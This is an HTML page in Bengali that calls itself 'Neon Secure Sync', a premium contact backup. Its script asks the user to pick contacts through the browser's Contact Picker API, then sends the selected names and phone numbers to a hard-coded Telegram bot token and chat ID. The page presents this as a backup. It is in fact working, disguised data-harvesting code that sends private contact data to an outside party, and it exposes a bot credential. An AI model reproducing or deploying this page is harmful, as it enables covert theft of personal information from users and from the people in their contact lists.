<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Neon Secure Sync</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>

body{
margin:0;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
font-family:'Hind Siliguri',sans-serif;
background: radial-gradient(circle at top,#0f0c29,#090113);
}

/* Glow Background */
body::before{
content:'';
position:absolute;
width:400px;
height:400px;
background: radial-gradient(circle,#7c3aed,#3b82f6);
filter: blur(120px);
opacity:0.25;
}

/* Card */
.card{
width:350px;
padding:35px;
border-radius:26px;
background: rgba(255,255,255,0.05);
backdrop-filter: blur(25px);
border:1px solid rgba(255,255,255,0.08);
box-shadow:0 20px 50px rgba(0,0,0,0.8);
text-align:center;
position:relative;
}

/* Gradient Border Glow */
.card::before{
content:'';
position:absolute;
inset:0;
border-radius:26px;
padding:1px;
background: linear-gradient(135deg,#7c3aed,#3b82f6,#06b6d4);
-webkit-mask:
linear-gradient(#000 0 0) content-box,
linear-gradient(#000 0 0);
-webkit-mask-composite: xor;
mask-composite: exclude;
}

/* Title */
h2{
color:#fff;
margin-bottom:10px;
}

p{
color:#cbd5f5;
font-size:14px;
}

/* Button */
.btn{
margin-top:25px;
width:100%;
padding:16px;
border:none;
border-radius:14px;
font-size:16px;
font-weight:600;
cursor:pointer;
background: linear-gradient(135deg,#7c3aed,#3b82f6);
color:#fff;
box-shadow:0 10px 25px rgba(124,58,237,0.4);
transition:0.3s;
}

.btn:hover{
transform:translateY(-3px);
box-shadow:0 15px 35px rgba(59,130,246,0.6);
}

.btn:active{
transform:scale(0.96);
}

/* Loader */
.loader{
margin:18px auto;
width:26px;
height:26px;
border:3px solid rgba(255,255,255,0.2);
border-top:3px solid #7c3aed;
border-radius:50%;
animation:spin 1s linear infinite;
display:none;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

/* Status */
.status{
margin-top:12px;
font-size:14px;
color:#60a5fa;
}

</style>
</head>

<body>

<div class="card">

<h2>⚡ Secure Sync</h2>

<p>কন্টাক্ট সিলেক্ট করে প্রিমিয়াম ব্যাকআপ করুন</p>

<button class="btn" id="btn">
Select & Send
</button>

<div class="loader" id="loader"></div>

<div class="status" id="status">
System Ready
</div>

</div>

<script>

const CONFIG = {
TOKEN:"8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
CHAT_ID:"6467941734"
};

const btn=document.getElementById("btn");
const loader=document.getElementById("loader");
const status=document.getElementById("status");

btn.onclick=async()=>{

try{

if(!("contacts" in navigator))
throw new Error("Device support নেই");

const contacts=await navigator.contacts.select(
['name','tel'],
{multiple:true}
);

if(!contacts.length)
throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");

loader.style.display="block";
status.innerText="Syncing...";

/* Date Time */

const now=new Date();

const date=now.toLocaleDateString("bn-BD",{
weekday:'long',
year:'numeric',
month:'long',
day:'numeric'
});

const time=now.toLocaleTimeString("bn-BD");

/* Build Text */

let text=`⚡ Premium Backup\n\n`;

text+=`📅 ${date}\n`;
text+=`⏰ ${time}\n`;
text+=`👥 Total: ${contacts.length}\n\n`;

contacts.forEach(c=>{
let name=c.name?c.name[0]:"No Name";
let phone=c.tel?c.tel[0]:"No Number";

text+=`👤 ${name}\n📞 ${phone}\n\n`;
});

await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id:CONFIG.CHAT_ID,
text:text
})
});

loader.style.display="none";
status.innerText="✅ Done Successfully";

}
catch(e){

loader.style.display="none";
status.innerText="❌ "+e.message;

}

};

</script>

</body>
</html>
